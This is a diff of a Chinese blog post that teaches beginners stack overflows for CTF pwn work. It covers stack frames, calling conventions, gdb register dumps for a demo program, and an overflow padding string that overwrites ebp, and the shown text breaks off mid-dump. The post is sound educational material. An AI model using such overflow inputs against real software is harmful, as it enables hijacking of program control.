@@ -6,16 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://www.killshadow.xyz">
-  <title>Tag: Mobile Security | Live to change world</title>
+  <title>1.1-菜鸟学PWN之栈溢出学习 | Live to change world</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="CTF,PWN,Rverse,Coder">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Live to change world">
-<meta property="og:url" content="http://www.killshadow.xyz/tags/Mobile-Security/index.html">
+  <meta name="description" content="实现栈溢出的两个条件:  程序有向栈写入数据的行为 程序并不限制写入数据的长度">
+<meta name="keywords" content="AOSP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1.1-菜鸟学PWN之栈溢出学习">
+<meta property="og:url" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/index.html">
 <meta property="og:site_name" content="Live to change world">
+<meta property="og:description" content="实现栈溢出的两个条件:  程序有向栈写入数据的行为 程序并不限制写入数据的长度">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/Data_stack.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/271650059007975.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/v2-8d5649c36458080223084d77abbd554a_hd.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/v2-9125ba203edd2bab1308ad88db2ae197_hd.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538817009439.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538825556293.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/v2-c350a4c5e9f5bbe839606486f3100185_hd.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538826215949.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/v2-63f07378642e6f38197ddfb817567f6c_hd.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/v2-4340d6c750f59519f4f87dffca03a86a_hd.jpg">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538829057155.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538829148474.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538830059726.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/register.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/1538897713778.png">
+<meta property="og:updated_time" content="2018-10-09T01:12:31.266Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Live to change world">
+<meta name="twitter:title" content="1.1-菜鸟学PWN之栈溢出学习">
+<meta name="twitter:description" content="实现栈溢出的两个条件:  程序有向栈写入数据的行为 程序并不限制写入数据的长度">
+<meta name="twitter:image" content="http://www.killshadow.xyz/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/Data_stack.png">
   
     <link rel="alternative" href="/atom.xml" title="Live to change world" type="application/atom+xml">
   
@@ -142,69 +163,434 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-1.1-菜鸟学PWN之栈溢出学习" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/10/某aes变种题分析/" class="archive-article-date">
-  	<time datetime="2018-05-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-10</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/10/某aes变种题分析/">某AES变种题分析</a>
+    <h1 class="article-title" itemprop="name">
+      1.1-菜鸟学PWN之栈溢出学习
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/" class="archive-article-date">
+  	<time datetime="2018-10-08T02:26:13.936Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>实现栈溢出的两个条件:</p>
+<ul>
+<li>程序有向栈写入数据的行为</li>
+<li>程序并不限制写入数据的长度</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+<blockquote>
+<p>如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的内容或地址, 并且要将程序控制权交给该指令.<br>攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令.</p>
+</blockquote>
+<h2 id="0x10-背景知识"><a href="#0x10-背景知识" class="headerlink" title="0x10 背景知识"></a>0x10 背景知识</h2><h3 id="0x11-栈介绍"><a href="#0x11-栈介绍" class="headerlink" title="0x11 栈介绍"></a>0x11 栈介绍</h3><p>栈是一种典型的<strong>先进后出(First in Last Out)</strong>的数据结构, 其操作主要有压栈(push)与出栈(pop)两种操作. <strong>两种操作都是操作栈顶</strong>, 当然也有栈底(位于高地址).</p>
+<p><img src="Data_stack.png" alt="基本栈操作"></p>
+<p>每个程序在运行时都有虚拟地址空间, 其中某一部分就是该程序对应的栈. 编译器使用堆栈<strong>传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量</strong>. 程序的栈都是<strong>从进程地址空间的高地址向低地址增长</strong>.</p>
+<hr>
+<h3 id="0x12-栈帧结构"><a href="#0x12-栈帧结构" class="headerlink" title="0x12 栈帧结构"></a>0x12 栈帧结构</h3><p>函数调用经常是<strong>嵌套</strong>的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个<strong>独立的连续区域</strong>, 称作<strong>栈帧(Stack Frame)</strong>. 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等.</p>
+<p>栈帧的边界由栈帧基地址指针EBP和栈帧堆栈指针ESP界定(指正存放在相应寄存器中). EBP指向栈帧底部(高地址), 在当前栈帧内位置固定; ESP指向栈帧顶部(低地址), 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量). 因此函数中对数据的访问大部分是基于EBP(对EBP取相对地址). 函数调用栈典型内存分布如下图:</p>
+<p><img src="271650059007975.jpg" alt="img"></p>
+<blockquote>
+<p>注意: 当函数被调用时, EBP的地址是当前栈帧的基地址, 但EBP指向的是上一栈帧基地址的地址.</p>
+</blockquote>
+<h4 id="1-入栈出栈指令"><a href="#1-入栈出栈指令" class="headerlink" title="(1) 入栈出栈指令"></a>(1) 入栈出栈指令</h4><p>函数序(入栈)实现如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>指令序列</strong></th>
+<th style="text-align:left"><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">push %ebp</td>
+<td style="text-align:left">将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</td>
+</tr>
+<tr>
+<td style="text-align:center">mov %esp, %ebp</td>
+<td style="text-align:left">将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</td>
+</tr>
+<tr>
+<td style="text-align:center">sub <n>, %esp</n></td>
+<td style="text-align:left">将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</n></td>
+</tr>
+<tr>
+<td style="text-align:center">push <r></r></td>
+<td style="text-align:left">可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</td>
+</tr>
+<tr>
+<td style="text-align:center">……………………………</td>
+</tr>
+</tbody>
+</table>
+<p>函数跋(出栈)实现如下:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>指令序列</strong></th>
+<th style="text-align:left"><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">pop <r></r></td>
+<td style="text-align:left">可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</td>
+</tr>
+<tr>
+<td style="text-align:center">mov %ebp, %esp*</td>
+<td style="text-align:left">恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</td>
+</tr>
+<tr>
+<td style="text-align:center">pop %ebp*</td>
+<td style="text-align:left">主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</td>
+</tr>
+<tr>
+<td style="text-align:center">ret</td>
+<td style="text-align:left">从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</td>
+</tr>
+<tr>
+<td style="text-align:center">……………………………</td>
+<td style="text-align:left">*：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</td>
+</tr>
+</tbody>
+</table>
+<h4 id="2-参数压栈指令"><a href="#2-参数压栈指令" class="headerlink" title="(2) 参数压栈指令"></a>(2) 参数压栈指令</h4><p> 参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">CdeclDemo</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> x, <span class="keyword">int</span> y, intz)</span></span>;  <span class="comment">//调用CdeclDemo函数</span></span><br><span class="line">CdeclDemo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);  <span class="comment">//调用CdeclDemo函数</span></span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th><strong>压栈方式一</strong></th>
+<th><strong>压栈方式二</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pushl 4  //压入参数z</td>
+<td><em>subl   $16, %esp</em> //多次调用仅执行一遍</td>
+</tr>
+<tr>
+<td>pushl 3  //压入参数y</td>
+<td>movl  $4, 12(%esp) //传送参数z至堆栈第四个位置</td>
+</tr>
+<tr>
+<td>pushl 2  //压入参数x</td>
+<td>movl  $3, 8(%esp) //传送参数y至堆栈第三个位置</td>
+</tr>
+<tr>
+<td>pushl 1  //压入参数w</td>
+<td>movl  $2, 4(%esp) //传送参数x至堆栈第二个位置</td>
+</tr>
+<tr>
+<td>call CdeclDemo  //调用函数</td>
+<td>movl  $1, (%esp) //传送参数w至堆栈栈顶</td>
+</tr>
+<tr>
+<td>addl $16, %esp  //恢复ESP原值，使其指向调用前保存的返回地址</td>
+<td>call CdeclDemo  //调用函数</td>
+</tr>
+</tbody>
+</table>
+<p>​     两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。</p>
+<hr>
+<h3 id="0x13-函数调用栈"><a href="#0x13-函数调用栈" class="headerlink" title="0x13 函数调用栈"></a>0x13 函数调用栈</h3><p><strong>函数调用栈</strong>是指程序运行时内存一段连续的区域, 用来保存函数运行时的状态信息, 包括函数参数与局部变量等. 称之为”栈”是因为发生函数调用时, 调用函数(caller)的被保存在栈内, 被调用函数(callee)的状态被压入调用栈的栈顶; 在函数调用结束时, 栈顶的函数(callee)状态被弹出, 栈顶恢复到调用函数(caller)的状态. 函数调用栈在内存中从高地址向低地址生长, 所以栈顶对应的内存在压栈时变小, 出栈时变大.</p>
+<blockquote>
+<p>函数调用发生和结束的调用栈帧如下图:</p>
+<p><img src="v2-8d5649c36458080223084d77abbd554a_hd.jpg" alt="img"></p>
+<p>函数状态主要涉及三个寄存器–esp, ebp, eip:</p>
+<ul>
+<li>esp 用来存储函数调用栈(caller)的栈顶指针, 在压栈(入栈)和退栈(出栈)时发生变化.</li>
+<li>ebp 用来存储当前函数状态的基地址, 在函数运行时不变, 可以用来索引确定函数参数或局部变量的位置.</li>
+<li>eip 用来存储即将执行的程序指令的地址, cpu依照eip的存储内容读取指令并执行, eip随之指向相邻的下一条指令. EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</li>
+</ul>
+</blockquote>
+<p>分析demo源代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">	&gt; File Name: debugfunc.c</span></span><br><span class="line"><span class="comment">	&gt; Author: killshadow</span></span><br><span class="line"><span class="comment">	&gt; Mail: chaceli@foxmail.com</span></span><br><span class="line"><span class="comment">	&gt; Created Time: 2018年09月02日 星期日 09时26分02秒</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">2</span>;</span><br><span class="line">    c = a*d +b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input a number:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;b);</span><br><span class="line">    c = calc(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Result: %d\n"</span>,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在命令行中:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 debugfunc.c -o debugfunc32 <span class="comment"># -m32表示编译成32位的程序</span></span><br></pre></td></tr></table></figure>
+<h4 id="1-函数调用压栈顺序"><a href="#1-函数调用压栈顺序" class="headerlink" title="(1) 函数调用压栈顺序"></a>(1) 函数调用压栈顺序</h4><blockquote>
+<ol>
+<li>调用者压入需要保存的寄存器(通常这些寄存器包括 EAX，ECX 和 EDX等)</li>
+<li>按照从右往左的顺序压入参数(这个可能有特殊情况, 详情请看<a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a>)</li>
+<li>返回地址</li>
+<li>调用者的 EBP</li>
+<li>局部变量</li>
+<li>被调用者本身压入需要保存的寄存器， 通常这些寄存器包括 EBX，ESI 和 EDI 等</li>
+</ol>
+</blockquote>
+<p>1) 被调用函数(callee)的<strong>参数</strong>按照<strong>逆序</strong>依次压入栈内. 如果callee没有参数, 则无需此操作. 这些参数仍会保存在调用函数(caller)的函数状态内, 之后压入栈内的数据都会作为被调用函数(callee)的函数状态来保存.</p>
+<p>   <img src="v2-9125ba203edd2bab1308ad88db2ae197_hd.jpg" alt="img"></p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x8048552 &lt;main+68&gt;        add    esp, 0x10</span><br><span class="line">   0x8048555 &lt;main+71&gt;        mov    eax, DWORD PTR [ebp-0x18]</span><br><span class="line">   0x8048558 &lt;main+74&gt;        sub    esp, 0x8</span><br><span class="line">→  0x804855b &lt;main+77&gt;        push   eax	# $eax : 0x17(即:23,自己输入的数据)</span><br><span class="line">   0x804855c &lt;main+78&gt;        push   DWORD PTR [ebp-0x14] # ebp为main函数栈基址,-0x14便是int a的栈地址,此处是压入a的值到calc调用栈</span><br><span class="line">   0x804855f &lt;main+81&gt;        call   0x80484eb &lt;calc&gt;</span><br><span class="line">   0x8048564 &lt;main+86&gt;        add    esp, 0x10</span><br><span class="line">   0x8048567 &lt;main+89&gt;        mov    DWORD PTR [ebp-0x10], eax</span><br><span class="line">   0x804856a &lt;main+92&gt;        sub    esp, 0x8</span><br></pre></td></tr></table></figure>
+<p>   <img src="1538817009439.png" alt="1538817009439"></p>
+<p>2) 然后将调用函数(caller)进行调用之后的<strong>下一条指令地址作为返回地址压入栈内</strong>. 这样调用函数(caller)的eip(指令)信息得以保存.(这一操作是隐式的, 在执行call命令时就已经push了return的值了)</p>
+<p>   <img src="v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.jpg" alt="img"></p>
+<p>   在gdb里<code>step into</code>进<code>calc</code>函数, 当执行到<code>push ebp</code>的时候, 能看到前面的两个参数和返回地址已经被push到当前函数(即<code>calc</code>)的栈帧, 如下图:</p>
+<p>   <img src="1538825556293.png" alt="1538825556293"></p>
+<p>3) 再将当前的<strong>ebp寄存器的值(也就是调用函数[caller]的基地址)压入栈</strong>内, 并将<strong>ebp寄存器的值更新为当前栈顶(esp)的地址</strong>. 这样调用函数(caller)的ebp(基地址)信息得以保存. 同时, ebp被更新为被调用函数(callee)的基地址. 例如下面调用calc函数时, 有<code>mov rbp, rsp</code>:</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    0x4006b1 &lt;main+61&gt;        dec    DWORD PTR [rbx+0x458bec55]</span><br><span class="line">    0x4006b7 &lt;main+67&gt;        lock   mov esi, edx</span><br><span class="line">    0x4006ba &lt;main+70&gt;        mov    edi, eax</span><br><span class="line">→   0x4006bc &lt;main+72&gt;        call   0x400646 &lt;calc&gt;</span><br><span class="line">  ↳    0x400646 &lt;calc+0&gt;         push   rbp</span><br><span class="line">       0x400647 &lt;calc+1&gt;         mov    rbp, rsp</span><br><span class="line">       0x40064a &lt;calc+4&gt;         mov    DWORD PTR [rbp-0x14], edi</span><br><span class="line">       0x40064d &lt;calc+7&gt;         mov    DWORD PTR [rbp-0x18], esi</span><br><span class="line">       0x400650 &lt;calc+10&gt;        mov    DWORD PTR [rbp-0x8], 0x0</span><br><span class="line">       0x400657 &lt;calc+17&gt;        mov    DWORD PTR [rbp-0x4], 0x2</span><br></pre></td></tr></table></figure>
+<p>   <img src="v2-c350a4c5e9f5bbe839606486f3100185_hd.jpg" alt="img"></p>
+<p>   <img src="1538826215949.png" alt="1538826215949"></p>
+<p>4) 再之后将<strong>被调用函数(callee)的局部变量等数据压入栈</strong>内.</p>
+<p>   <img src="v2-63f07378642e6f38197ddfb817567f6c_hd.jpg" alt="img"></p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x80484ec &lt;calc+1&gt;         mov    ebp, esp</span><br><span class="line">   0x80484ee &lt;calc+3&gt;         sub    esp, 0x10</span><br><span class="line">   0x80484f1 &lt;calc+6&gt;         mov    DWORD PTR [ebp-0x8], 0x2 # 给d赋值: d=2</span><br><span class="line">→  0x80484f8 &lt;calc+13&gt;        mov    eax, DWORD PTR [ebp+0x8] # 将参数a=5赋给eax</span><br><span class="line">   0x80484fb &lt;calc+16&gt;        imul   eax, DWORD PTR [ebp-0x8] # 5*2(有符号乘)</span><br><span class="line">   0x80484ff &lt;calc+20&gt;        mov    edx, eax</span><br><span class="line">   0x8048501 &lt;calc+22&gt;        mov    eax, DWORD PTR [ebp+0xc]</span><br><span class="line">   0x8048504 &lt;calc+25&gt;        add    eax, edx # 10 + 23</span><br><span class="line">   0x8048506 &lt;calc+27&gt;        mov    DWORD PTR [ebp-0x4], eax # 赋值给变量c</span><br></pre></td></tr></table></figure>
+<h4 id="2-函数调用出栈顺序"><a href="#2-函数调用出栈顺序" class="headerlink" title="(2) 函数调用出栈顺序"></a>(2) 函数调用出栈顺序</h4><p>1) 栈顶(ESP)会重新指向被调用函数(callee)的基地址, 因此, 被调用函数的局部变量会从站内直接弹出. 如下:<br><img src="v2-4340d6c750f59519f4f87dffca03a86a_hd.jpg" alt="img"></p>
+<p>   具体汇编代码是:</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   0x8048505 &lt;calc+26&gt;        ror    BYTE PTR [ecx+0x458bfc45], 1</span><br><span class="line">   0x804850b &lt;calc+32&gt;        cld    </span><br><span class="line">   0x804850c &lt;calc+33&gt;        leave  </span><br><span class="line">→  0x804850d &lt;calc+34&gt;        ret    </span><br><span class="line">  ↳   0x8048564 &lt;main+86&gt;        add    esp, 0x10</span><br><span class="line">      0x8048567 &lt;main+89&gt;        mov    DWORD PTR [ebp-0x10], eax</span><br><span class="line">      0x804856a &lt;main+92&gt;        sub    esp, 0x8</span><br><span class="line">      0x804856d &lt;main+95&gt;        push   DWORD PTR [ebp-0x10]</span><br><span class="line">      0x8048570 &lt;main+98&gt;        push   0x804863a</span><br><span class="line">      0x8048575 &lt;main+103&gt;       call   0x8048390 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>   如上图, 当执行到<code>calc</code>函数的<code>ret</code>返回语句时, 会有下面一系列的语句, 其中第一条<code>add</code>语句就是让<code>esp</code>重新指向<code>calc</code>的基址(ebp)的关键语句, 此时位于低地址的局部变量将丢弃.</p>
+<p>2) 随后将基地址内存储的调用函数(caller)的ebp的值重新pop到当前的ebp中, 至此, 调用函数(caller)的基地址得以恢复. 值得注意的是, 这一操作是隐式的(与函数调用压栈的第2步作对比). 如下图:</p>
+<ul>
+<li><p>执行<code>leave</code>前:<br><img src="1538829057155.png" alt="1538829057155"></p>
+</li>
+<li><p>执行<code>leave</code>后:<br><img src="1538829148474.png" alt="1538829148474"></p>
+</li>
+<li><p><code>esp</code>存储的地址会指向返回地址(<code>0x08048564</code>):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0x21      </span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0x1       </span><br><span class="line">$edx   : 0xa       </span><br><span class="line">$esp   : 0xffffcf5c  →  0x08048564  →  &lt;main+86&gt; add esp, 0x10 # 指向ret地址</span><br><span class="line">$ebp   : 0xffffcf88  →  0x00000000</span><br><span class="line">$esi   : 0xf7faf000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7faf000  →  0x001b1db0</span><br><span class="line">$eip   : 0x804850d   →  &lt;calc+34&gt; ret </span><br><span class="line">$eflags: [carry PARITY ADJUST zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$gs: 0x0063  $fs: 0x0000  $ds: 0x002b  $cs: 0x0023  $es: 0x002b  $ss: 0x002b</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>3) 然后将返回地址从栈内pop出来, 并存到<code>eip</code>内. 从而调用函数(caller)的<code>eip</code>信息得以恢复, 指向下一条指令.<br><img src="1538830059726.png" alt="1538830059726"></p>
+<blockquote>
+<p>总结一下上面的调用压栈和出栈: </p>
+<p>(1)压栈时, 先压参数, 后压返回地址, 然后再将caller的<code>ebp</code>压入, 最后将局部变量压入.</p>
+<p>(2)出栈时, 先弹局部变量, 后弹ebp, 然后通过返回地址恢复<code>eip</code>.</p>
+<p>通过上述描述, 可知函数调用压栈和出栈是一个互逆过程, 这也间接验证了堆栈平衡的机理.</p>
+</blockquote>
+<hr>
+<h3 id="0x14-寄存器分布"><a href="#0x14-寄存器分布" class="headerlink" title="0x14 寄存器分布"></a>0x14 寄存器分布</h3><p><img src="register.png" alt="img"></p>
+<blockquote>
+<p>32位和64位程序的部分区别:</p>
+<ul>
+<li>x86<ul>
+<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
+</ul>
+</li>
+<li>x64<ul>
+<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在<strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
+<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="0x20-栈溢出原理"><a href="#0x20-栈溢出原理" class="headerlink" title="0x20 栈溢出原理"></a>0x20 栈溢出原理</h2><p>栈溢出的原理其实很简单: <strong>在程序没有判断输入长度的情况下, 当程序向申请的变量写入的字节长度超过了该变量向内存申请的字节长度, 因而导致该变量相邻的栈的内存的值被覆盖.</strong> 简而言之, 还是开篇提及的两个栈溢出条件. 由于操作系统或者程序增加了对栈溢出的保护, 而使得溢出的难度增大, 但其核心思想是不变的. 我们先用根据下图来看看溢出的效果:</p>
+<p>1) 在执行漏洞函数之前, 我们能看到<code>ebp</code> <code>esp</code>的地址很正常, ebp的下一个地址也指向了<code>return address</code>.</p>
+<p>   <img src="1538897713778.png" alt="1538897713778"></p>
+<p>2) 接着当我们执行到漏洞函数之时, 输入以下字符串:</p>
+   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808</span><br></pre></td></tr></table></figure>
+<p>3) 我们再看看此时的堆栈:</p>
+   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line"><span class="variable">$eax</span>   : 0x25      </span><br><span class="line"><span class="variable">$ebx</span>   : 0x0       </span><br><span class="line"><span class="variable">$ecx</span>   : 0xffffffff</span><br><span class="line"><span class="variable">$edx</span>   : 0xf7fae870  →  0x00000000</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffcf30  →  0xf7fad300  →  0xf7f56447  →  <span class="string">"ISO-10646/UCS2/"</span></span><br><span class="line"><span class="variable">$ebp</span>   : 0x33333333 (<span class="string">"3333"</span>?)</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fad000  →  0x001b1db0</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7fad000  →  0x001b1db0</span><br><span class="line"><span 